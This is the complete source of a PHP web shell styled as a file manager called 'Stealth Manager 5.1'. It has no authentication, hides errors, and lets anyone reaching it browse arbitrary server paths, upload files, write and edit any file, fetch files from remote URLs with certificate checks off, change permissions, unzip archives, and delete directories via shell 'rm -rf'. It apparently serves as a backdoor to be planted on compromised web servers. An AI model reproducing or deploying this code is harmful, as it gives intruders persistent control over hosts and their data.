<?php
error_reporting(0);
ini_set('display_errors', 0);
set_time_limit(0);

$path = isset($_REQUEST['path']) ? $_REQUEST['path'] : getcwd();
$path = str_replace('\\', '/', realpath($path));
if (!$path || !is_dir($path)) {
    $path = str_replace('\\', '/', getcwd());
}

$msg = '';

if (isset($_POST['upload'])) {
    $dest = $path . '/' . $_FILES['file']['name'];
    if (@move_uploaded_file($_FILES['file']['tmp_name'], $dest)) {
        header("Location: ?path=" . urlencode($path) . "&msg=Upload+Success");
        exit;
    } else {
        $msg = "❌ Error: Upload Failed (Check Permissions)";
    }
}

if (isset($_POST['newFile']) && !empty($_POST['filename'])) {
    $dest = $path . '/' . basename($_POST['filename']);
    if (!file_exists($dest)) {
        if (@touch($dest)) {
            header("Location: ?path=" . urlencode($path) . "&msg=File+Created");
            exit;
        } else { $msg = "❌ Error: Permission Denied"; }
    } else { $msg = "❌ Error: File exists"; }
}

if (isset($_POST['newFolder']) && !empty($_POST['foldername'])) {
    $dest = $path . '/' . basename($_POST['foldername']);
    if (@mkdir($dest, 0755, true)) {
        header("Location: ?path=" . urlencode($path) . "&msg=Folder+Created");
        exit;
    } else { $msg = "❌ Error: Cannot create folder"; }
}


if (isset($_POST['applyRename'])) {
    $old = $path . '/' . $_POST['oldName'];
    $new = $path . '/' . $_POST['newName'];
    if (@rename($old, $new)) {
        header("Location: ?path=" . urlencode($path) . "&msg=Renamed");
        exit;
    } else { $msg = "❌ Error: Rename failed"; }
}

if (isset($_POST['applyChmod'])) {
    if (@chmod($path . '/' . $_POST['chmodFile'], octdec($_POST['perm']))) {
        header("Location: ?path=" . urlencode($path) . "&msg=CHMOD+Success");
        exit;
    }
}

if (isset($_POST['save'])) {
    $target_path = $_POST['target_path'];
    $file = $target_path . '/' . $_POST['file_name'];
    $content = $_POST['content'];
    
    if (isset($_POST['content'])) {
        if (@file_put_contents($file, $content) !== false) {
            header("Location: ?path=" . urlencode($target_path) . "&msg=Saved+Successfully");
            exit;
        } else { 
            $msg = "❌ Error: Cannot write to " . htmlspecialchars($_POST['file_name']); 
        }
    }
}

if (isset($_POST['downloadUrl']) && !empty($_POST['url'])) {
    $url = $_POST['url'];
    $name = basename($url);
    $data = @file_get_contents($url);
    if ($data === false && function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        $data = curl_exec($ch);
        curl_close($ch);
    }
    if ($data && @file_put_contents($path.'/'.$name, $data)) {
        $msg = "✅ Download Success";
    } else { $msg = "❌ Download Failed"; }
}

if (isset($_POST['multiAction']) && !empty($_POST['files'])) {
    if ($_POST['action_type'] == 'delete') {
        foreach ($_POST['files'] as $f) {
            $target = $path . '/' . $f;
            is_dir($target) ? @exec("rm -rf " . escapeshellarg($target)) : @unlink($target);
        }
        header("Location: ?path=" . urlencode($path) . "&msg=Items+Deleted");
        exit;
    }
    if ($_POST['action_type'] == 'zip' && class_exists('ZipArchive')) {
        $zip = new ZipArchive();
        $zipName = $path . '/archive_' . time() . '.zip';
        if ($zip->open($zipName, ZipArchive::CREATE) === TRUE) {
            foreach ($_POST['files'] as $f) {
                $f_path = $path . '/' . $f;
                if (is_file($f_path)) $zip->addFile($f_path, $f);
            }
            $zip->close();
            header("Location: ?path=" . urlencode($path) . "&msg=Zip+Created");
            exit;
        }
    }
}

// 9. UNZIP
if (isset($_GET['unzip']) && class_exists('ZipArchive')) {
    $zip = new ZipArchive;
    $zipFile = $path . '/' . $_GET['unzip'];
    if ($zip->open($zipFile) === TRUE) {
        $zip->extractTo($path);
        $zip->close();
        header("Location: ?path=" . urlencode($path) . "&msg=Unzipped+Successfully");
        exit;
    } else { $msg = "❌ Unzip Failed"; }
}

// 10. SINGLE DELETE
if (isset($_GET['delete'])) {
    $target = $path . '/' . $_GET['delete'];
    is_dir($target) ? @exec("rm -rf " . escapeshellarg($target)) : @unlink($target);
    header("Location: ?path=" . urlencode($path));
    exit;
}

if (isset($_GET['msg'])) $msg = "✅ " . htmlspecialchars($_GET['msg']);
function perms($f){ return substr(sprintf('%o', @fileperms($f)), -4); }
function h($s){ return htmlspecialchars($s, ENT_QUOTES); }
?>

<!DOCTYPE html>
<html>
<head>
    <title>Stealth Manager 5.1</title>
    <style>
        body{background:#000;color:#0f0;font-family:monospace;font-size:12px;padding:20px}
        input,textarea,select,button{background:#111;color:#0f0;border:1px solid #333;padding:5px;margin:2px}
        table{width:100%;border-collapse:collapse;margin-top:20px}
        th,td{border:1px solid #222;padding:8px;text-align:left}
        tr:hover{background:#0a0a0a}
        .msg{color:yellow;padding:10px;border:1px dashed yellow;margin-bottom:10px}
        a{color:#00ffcc;text-decoration:none}
        .btn-red{color:#ff3333}
        .toolbar{background:#111;padding:10px;border:1px solid #333;margin-bottom:10px}
    </style>
</head>
<body>

<h3>📁 Path: <?=h($path)?></h3>
<?php if($msg) echo "<div class='msg'>$msg</div>"; ?>

<div class="toolbar">
    <form method="post" style="display:inline">
        <input type="text" name="filename" placeholder="newfile.php">
        <button name="newFile">+ File</button>
    </form>
    <form method="post" style="display:inline; margin-left:15px">
        <input type="text" name="foldername" placeholder="new_folder">
        <button name="newFolder">+ Folder</button>
    </form>
    <form method="post" style="display:inline; margin-left:15px">
        <input type="text" name="url" placeholder="http://link-to-file.zip">
        <button name="downloadUrl">Remote Download</button>
    </form>
</div>

<form method="post" enctype="multipart/form-data">
    <input type="file" name="file">
    <button name="upload">Upload</button> | 
    <input name="path" value="<?=h($path)?>" style="width:40%">
    <button type="submit">Jump</button>
</form>

<form method="post">
    <table>
        <thead>
            <tr style="background:#111">
                <th><input type="checkbox" onclick="var c=document.getElementsByName('files[]');for(var i=0;i<c.length;i++)c[i].checked=this.checked"></th>
                <th>Name</th><th>Size</th><th>Perms</th><th>Options</th>
            </tr>
        </thead>
        <tbody>
            <tr>
                <td></td>
                <td colspan="4"><a href="?path=<?=urlencode(dirname($path))?>">.. Parent Directory</a></td>
            </tr>
            <?php
            $items = scandir($path);
            foreach($items as $f):
                if($f == '.' || $f == '..') continue;
                $full = $path.'/'.$f;
                $is_dir = is_dir($full);
            ?>
            <tr>
                <td><input type="checkbox" name="files[]" value="<?=h($f)?>"></td>
                <td><?= $is_dir ? "📁 <a href='?path=".urlencode($full)."'>$f</a>" : "📄 $f" ?></td>
                <td><?= $is_dir ? 'DIR' : round(@filesize($full)/1024, 2).' KB' ?></td>
                <td><a href="?path=<?=urlencode($path)?>&chmod_ui=<?=h($f)?>"><?=perms($full)?></a></td>
                <td>
                    <a href="?path=<?=urlencode($path)?>&edit=<?=urlencode($f)?>">Edit</a> |
                    <a href="?path=<?=urlencode($path)?>&rename_ui=<?=urlencode($f)?>">Rename</a> |
                    <?php if(!$is_dir && strpos($f, '.zip') !== false): ?>
                        <a href="?path=<?=urlencode($path)?>&unzip=<?=urlencode($f)?>" style="color:yellow">Unzip</a> |
                    <?php endif; ?>
                    <a href="?path=<?=urlencode($path)?>&delete=<?=urlencode($f)?>" class="btn-red" onclick="return confirm('Delete?')">Del</a>
                </td>
            </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
    <div style="margin-top:10px">
        <select name="action_type">
            <option value="delete">Delete Selected</option>
            <option value="zip">Zip Selected</option>
        </select>
        <button name="multiAction">Apply Action</button>
    </div>
</form>

<?php if(isset($_GET['edit'])): 
    $filename = $_GET['edit'];
    $file_content = file_exists($path.'/'.$filename) ? h(file_get_contents($path.'/'.$filename)) : '';
?>
    <hr><h4>Editing: <?=h($filename)?></h4>
    <form method="post">
        <input type="hidden" name="target_path" value="<?=h($path)?>">
        <input type="hidden" name="file_name" value="<?=h($filename)?>">
        <textarea name="content" style="width:100%;height:400px"><?= $file_content ?></textarea><br>
        <button name="save" style="width:100%; background:green; color:#fff; cursor:pointer; font-weight:bold">SAVE CHANGES</button>
    </form>
<?php endif; ?>

<?php if(isset($_GET['rename_ui'])): ?>
    <hr><h4>Rename: <?=h($_GET['rename_ui'])?></h4>
    <form method="post">
        <input type="hidden" name="oldName" value="<?=h($_GET['rename_ui'])?>">
        <input type="text" name="newName" value="<?=h($_GET['rename_ui'])?>" style="width:300px">
        <button name="applyRename">Rename Now</button>
    </form>
<?php endif; ?>

<?php if(isset($_GET['chmod_ui'])): ?>
    <hr><h4>CHMOD: <?=h($_GET['chmod_ui'])?></h4>
    <form method="post">
        <input type="hidden" name="chmodFile" value="<?=h($_GET['chmod_ui'])?>">
        <input type="text" name="perm" value="<?=perms($path.'/'.$_GET['chmod_ui'])?>">
        <button name="applyChmod">Apply CHMOD</button>
    </form>
<?php endif; ?>

</body>
</html>
